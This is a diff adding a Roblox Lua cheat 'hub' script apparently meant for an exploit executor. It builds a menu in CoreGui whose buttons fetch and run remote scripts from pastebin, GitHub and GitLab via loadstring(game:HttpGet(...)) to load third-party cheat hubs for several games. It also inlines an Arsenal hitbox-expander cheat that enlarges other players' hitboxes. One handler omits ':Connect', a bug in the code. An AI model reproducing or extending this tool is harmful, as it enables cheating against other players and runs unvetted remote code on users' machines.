@@ -1,0 +1,383 @@
+-- by hacSYHU
+-- Version: 0.0.1
+
+-- Instances:
+
+local ScreenGui = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local Frame = Instance.new("Frame")
+local TextLabel = Instance.new("TextLabel")
+local Frame2 = Instance.new("Frame")
+local GameButton = Instance.new("TextButton")
+local CreditsButton = Instance.new("TextButton")
+local HubsButton = Instance.new("TextButton")
+local TextLabel_2 = Instance.new("TextLabel")
+local GameFrame = Instance.new("Frame")
+local KAT = Instance.new("TextButton")
+local PetSimulatorX = Instance.new("TextButton")
+local MM2 = Instance.new("TextButton")
+local Arsenal = Instance.new("TextButton")
+local _3006SCP = Instance.new("TextButton")
+local SindoLife = Instance.new("TextButton")
+local HubsFrame = Instance.new("Frame")
+local OwlHub = Instance.new("TextButton")
+local HatHub = Instance.new("TextButton")
+local FadedHub = Instance.new("TextButton")
+local CreditsFrame = Instance.new("Frame")
+local Credits = Instance.new("TextLabel")
+local Credits_2 = Instance.new("TextLabel")
+
+--Properties:
+
+ScreenGui.Parent = game.CoreGui
+
+main.Name = "main"
+main.Parent = ScreenGui
+main.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+main.BorderSizePixel = 0
+main.Position = UDim2.new(0.245582312, 0, 0.254852593, 0)
+main.Size = UDim2.new(0, 466, 0, 258)
+main.Active = true
+main.Draggable = true
+
+Frame.Parent = main
+Frame.BackgroundColor3 = Color3.fromRGB(68, 68, 68)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.00214585732, 0, 0, 0)
+Frame.Size = UDim2.new(0, 466, 0, 30)
+
+TextLabel.Parent = Frame
+TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.BackgroundTransparency = 1.000
+TextLabel.Position = UDim2.new(0.860515118, 0, 0, 0)
+TextLabel.Size = UDim2.new(0, 64, 0, 30)
+TextLabel.Font = Enum.Font.SciFi
+TextLabel.Text = "V.   0.0.1"
+TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel.TextSize = 14.000
+
+Frame2.Name = "Frame2"
+Frame2.Parent = main
+Frame2.BackgroundColor3 = Color3.fromRGB(68, 68, 68)
+Frame2.BorderSizePixel = 0
+Frame2.Position = UDim2.new(-6.5488365e-08, 0, 0, 0)
+Frame2.Size = UDim2.new(0, 111, 0, 258)
+
+GameButton.Name = "GameButton"
+GameButton.Parent = Frame2
+GameButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+GameButton.BackgroundTransparency = 1.000
+GameButton.Position = UDim2.new(2.74933143e-07, 0, 0.179844931, 0)
+GameButton.Size = UDim2.new(0, 109, 0, 36)
+GameButton.Font = Enum.Font.SciFi
+GameButton.Text = "Game"
+GameButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+GameButton.TextSize = 17.000
+
+CreditsButton.Name = "CreditsButton"
+CreditsButton.Parent = Frame2
+CreditsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CreditsButton.BackgroundTransparency = 1.000
+CreditsButton.Position = UDim2.new(0.00900928676, 0, 0.455038726, 0)
+CreditsButton.Size = UDim2.new(0, 109, 0, 36)
+CreditsButton.Font = Enum.Font.SciFi
+CreditsButton.Text = "Credits"
+CreditsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CreditsButton.TextSize = 17.000
+
+HubsButton.Name = "HubsButton"
+HubsButton.Parent = Frame2
+HubsButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+HubsButton.BackgroundTransparency = 1.000
+HubsButton.Position = UDim2.new(0.00900928397, 0, 0.319379747, 0)
+HubsButton.Size = UDim2.new(0, 109, 0, 36)
+HubsButton.Font = Enum.Font.SciFi
+HubsButton.Text = "Hubs"
+HubsButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+HubsButton.TextSize = 17.000
+
+TextLabel_2.Parent = main
+TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.BackgroundTransparency = 1.000
+TextLabel_2.BorderSizePixel = 0
+TextLabel_2.Size = UDim2.new(0, 110, 0, 30)
+TextLabel_2.Font = Enum.Font.SciFi
+TextLabel_2.Text = "HaC Hub"
+TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_2.TextSize = 22.000
+
+GameFrame.Name = "GameFrame"
+GameFrame.Parent = main
+GameFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+GameFrame.BackgroundTransparency = 1.000
+GameFrame.Position = UDim2.new(0.2360515, 0, 0.116279073, 0)
+GameFrame.Size = UDim2.new(0, 356, 0, 228)
+GameFrame.Visible = false
+
+KAT.Name = "KAT"
+KAT.Parent = GameFrame
+KAT.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+KAT.BackgroundTransparency = 1.000
+KAT.Position = UDim2.new(0.053370785, 0, 0.0394736826, 0)
+KAT.Size = UDim2.new(0, 107, 0, 34)
+KAT.Font = Enum.Font.SciFi
+KAT.Text = "KAT"
+KAT.TextColor3 = Color3.fromRGB(255, 255, 255)
+KAT.TextSize = 19.000
+
+PetSimulatorX.Name = "PetSimulatorX"
+PetSimulatorX.Parent = GameFrame
+PetSimulatorX.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+PetSimulatorX.BackgroundTransparency = 1.000
+PetSimulatorX.Position = UDim2.new(0.353932559, 0, 0.0394736826, 0)
+PetSimulatorX.Size = UDim2.new(0, 107, 0, 34)
+PetSimulatorX.Font = Enum.Font.SciFi
+PetSimulatorX.Text = "Pet Simulator X"
+PetSimulatorX.TextColor3 = Color3.fromRGB(255, 255, 255)
+PetSimulatorX.TextSize = 19.000
+
+MM2.Name = "MM2"
+MM2.Parent = GameFrame
+MM2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+MM2.BackgroundTransparency = 1.000
+MM2.Position = UDim2.new(0.654494345, 0, 0.0394736826, 0)
+MM2.Size = UDim2.new(0, 107, 0, 34)
+MM2.Font = Enum.Font.SciFi
+MM2.Text = "MM2"
+MM2.TextColor3 = Color3.fromRGB(255, 255, 255)
+MM2.TextSize = 19.000
+
+Arsenal.Name = "Arsenal"
+Arsenal.Parent = GameFrame
+Arsenal.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Arsenal.BackgroundTransparency = 1.000
+Arsenal.Position = UDim2.new(0.353932559, 0, 0.285087705, 0)
+Arsenal.Size = UDim2.new(0, 107, 0, 34)
+Arsenal.Font = Enum.Font.SciFi
+Arsenal.Text = "Arsenal"
+Arsenal.TextColor3 = Color3.fromRGB(255, 255, 255)
+Arsenal.TextSize = 19.000
+
+_3006SCP.Name = "3006 SCP"
+_3006SCP.Parent = GameFrame
+_3006SCP.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+_3006SCP.BackgroundTransparency = 1.000
+_3006SCP.Position = UDim2.new(0.654494405, 0, 0.285087705, 0)
+_3006SCP.Size = UDim2.new(0, 107, 0, 34)
+_3006SCP.Font = Enum.Font.SciFi
+_3006SCP.Text = "3008 SCP"
+_3006SCP.TextColor3 = Color3.fromRGB(255, 255, 255)
+_3006SCP.TextSize = 19.000
+
+SindoLife.Name = "SindoLife"
+SindoLife.Parent = GameFrame
+SindoLife.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+SindoLife.BackgroundTransparency = 1.000
+SindoLife.Position = UDim2.new(0.0533707738, 0, 0.285087705, 0)
+SindoLife.Size = UDim2.new(0, 107, 0, 34)
+SindoLife.Font = Enum.Font.SciFi
+SindoLife.Text = "Sindo Life"
+SindoLife.TextColor3 = Color3.fromRGB(255, 255, 255)
+SindoLife.TextSize = 19.000
+
+HubsFrame.Name = "HubsFrame"
+HubsFrame.Parent = main
+HubsFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+HubsFrame.BackgroundTransparency = 1.000
+HubsFrame.Position = UDim2.new(0.2360515, 0, 0.116279073, 0)
+HubsFrame.Size = UDim2.new(0, 356, 0, 228)
+HubsFrame.Visible = false
+
+OwlHub.Name = "OwlHub"
+OwlHub.Parent = HubsFrame
+OwlHub.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+OwlHub.BackgroundTransparency = 1.000
+OwlHub.Position = UDim2.new(0.053370785, 0, 0.0394736826, 0)
+OwlHub.Size = UDim2.new(0, 149, 0, 43)
+OwlHub.Font = Enum.Font.SciFi
+OwlHub.Text = "OwlHub"
+OwlHub.TextColor3 = Color3.fromRGB(255, 255, 255)
+OwlHub.TextSize = 19.000
+
+HatHub.Name = "HatHub"
+HatHub.Parent = HubsFrame
+HatHub.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+HatHub.BackgroundTransparency = 1.000
+HatHub.Position = UDim2.new(0.491573036, 0, 0.0394736826, 0)
+HatHub.Size = UDim2.new(0, 165, 0, 43)
+HatHub.Font = Enum.Font.SciFi
+HatHub.Text = "HatHub"
+HatHub.TextColor3 = Color3.fromRGB(255, 255, 255)
+HatHub.TextSize = 19.000
+
+FadedHub.Name = "FadedHub"
+FadedHub.Parent = HubsFrame
+FadedHub.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+FadedHub.BackgroundTransparency = 1.000
+FadedHub.Position = UDim2.new(0.053370785, 0, 0.258771926, 0)
+FadedHub.Size = UDim2.new(0, 165, 0, 43)
+FadedHub.Font = Enum.Font.SciFi
+FadedHub.Text = "FadedHub (da hood)"
+FadedHub.TextColor3 = Color3.fromRGB(255, 255, 255)
+FadedHub.TextSize = 19.000
+
+CreditsFrame.Name = "CreditsFrame"
+CreditsFrame.Parent = main
+CreditsFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+CreditsFrame.BackgroundTransparency = 1.000
+CreditsFrame.Position = UDim2.new(0.2360515, 0, 0.116279073, 0)
+CreditsFrame.Size = UDim2.new(0, 356, 0, 228)
+
+Credits.Name = "Credits"
+Credits.Parent = CreditsFrame
+Credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Credits.BackgroundTransparency = 1.000
+Credits.Position = UDim2.new(0.0365168527, 0, 0, 0)
+Credits.Size = UDim2.new(0, 247, 0, 42)
+Credits.Font = Enum.Font.SciFi
+Credits.Text = "-- By hacSYHU"
+Credits.TextColor3 = Color3.fromRGB(255, 255, 255)
+Credits.TextSize = 22.000
+Credits.TextXAlignment = Enum.TextXAlignment.Left
+
+Credits_2.Name = "Credits"
+Credits_2.Parent = CreditsFrame
+Credits_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Credits_2.BackgroundTransparency = 1.000
+Credits_2.Position = UDim2.new(0.0365168527, 0, 0.149122804, 0)
+Credits_2.Size = UDim2.new(0, 247, 0, 42)
+Credits_2.Font = Enum.Font.SciFi
+Credits_2.Text = "-- Soon Exploit"
+Credits_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Credits_2.TextSize = 22.000
+Credits_2.TextXAlignment = Enum.TextXAlignment.Left
+
+-- Scripts:
+
+local function IVRY_fake_script() -- GameButton.LocalScript 
+	local script = Instance.new('LocalScript', GameButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.CreditsFrame.Visible = false
+		script.Parent.Parent.Parent.HubsFrame.Visible = false
+		script.Parent.Parent.Parent.GameFrame.Visible = true
+	end)
+end
+coroutine.wrap(IVRY_fake_script)()
+local function FOLF_fake_script() -- CreditsButton.LocalScript 
+	local script = Instance.new('LocalScript', CreditsButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.CreditsFrame.Visible = true
+		script.Parent.Parent.Parent.HubsFrame.Visible = false
+		script.Parent.Parent.Parent.GameFrame.Visible = false
+	end)
+end
+coroutine.wrap(FOLF_fake_script)()
+local function TNCARKM_fake_script() -- HubsButton.LocalScript 
+	local script = Instance.new('LocalScript', HubsButton)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		script.Parent.Parent.Parent.CreditsFrame.Visible = false
+		script.Parent.Parent.Parent.HubsFrame.Visible = true
+		script.Parent.Parent.Parent.GameFrame.Visible = false
+	end)
+end
+coroutine.wrap(TNCARKM_fake_script)()
+local function WWSQHYF_fake_script() -- KAT.LocalScript 
+	local script = Instance.new('LocalScript', KAT)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet(('https://pastebin.com/raw/MHx8q6xP'),true))()
+	end)
+end
+coroutine.wrap(WWSQHYF_fake_script)()
+local function SEBFY_fake_script() -- PetSimulatorX.LocalScript 
+	local script = Instance.new('LocalScript', PetSimulatorX)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet"https://raw.githubusercontent.com/TSQ-new/RBXHub/main/RBXLoad")()
+	end)
+end
+coroutine.wrap(SEBFY_fake_script)()
+local function VCERBRX_fake_script() -- MM2.LocalScript 
+	local script = Instance.new('LocalScript', MM2)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/Doggo-cryto/EclipseMM2/master/Script", true))()
+	end)
+	
+end
+coroutine.wrap(VCERBRX_fake_script)()
+local function ABILNRR_fake_script() -- Arsenal.LocalScript 
+	local script = Instance.new('LocalScript', Arsenal)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		print("a")
+		function getplrsname()
+			for  i,v in pairs(game:GetChildren()) do
+				if v.ClassName == "Players" then
+					return v.Name
+				end
+			end
+		end
+		local players = getplrsname()
+		local plr = game[players].LocalPlayer
+		coroutine.resume(coroutine.create(function()
+			while  wait(1) do
+				coroutine.resume(coroutine.create(function()
+					for _,v in pairs(game[players]:GetPlayers()) do
+						if v.Name ~= plr.Name and v.Character then
+							v.Character.LowerTorso.CanCollide = false
+							v.Character.LowerTorso.Material = "Neon"
+							v.Character.LowerTorso.Size = Vector3.new(30,30,30)
+							v.Character.HumanoidRootPart.Size = Vector3.new(30,30,30)
+						end
+					end
+				end))
+			end
+		end))
+	end)
+end
+coroutine.wrap(ABILNRR_fake_script)()
+local function KTOMMOM_fake_script() -- _3006SCP.LocalScript 
+	local script = Instance.new('LocalScript', _3006SCP)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://pastebin.com/raw/KkYSW1Gu", true))()
+	end)
+	
+end
+coroutine.wrap(KTOMMOM_fake_script)()
+local function LEATNHK_fake_script() -- SindoLife.LocalScript 
+	local script = Instance.new('LocalScript', SindoLife)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/V.Ghub'))()
+	end)
+end
+coroutine.wrap(LEATNHK_fake_script)()
+local function IFVKAS_fake_script() -- OwlHub.LocalScript 
+	local script = Instance.new('LocalScript', OwlHub)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
+	end)
+end
+coroutine.wrap(IFVKAS_fake_script)()
+local function UMZEWDZ_fake_script() -- HatHub.LocalScript 
+	local script = Instance.new('LocalScript', HatHub)
+
+	script.Parent.MouseButton1Click:Connect(function()
+		loadstring(game:HttpGet(('https://gitlab.com/Tsuniox/lua-stuff/-/raw/master/RagdollEngineGUI.lua'),true))()
+	end)
+end
+coroutine.wrap(UMZEWDZ_fake_script)()
+local function TBKJFFQ_fake_script() -- FadedHub.LocalScript 
+	local script = Instance.new('LocalScript', FadedHub)
+
+	script.Parent.MouseButton1Click(function()
+		loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded/main/YesEpic", true))()
+	end)
+end
+coroutine.wrap(TBKJFFQ_fake_script)()
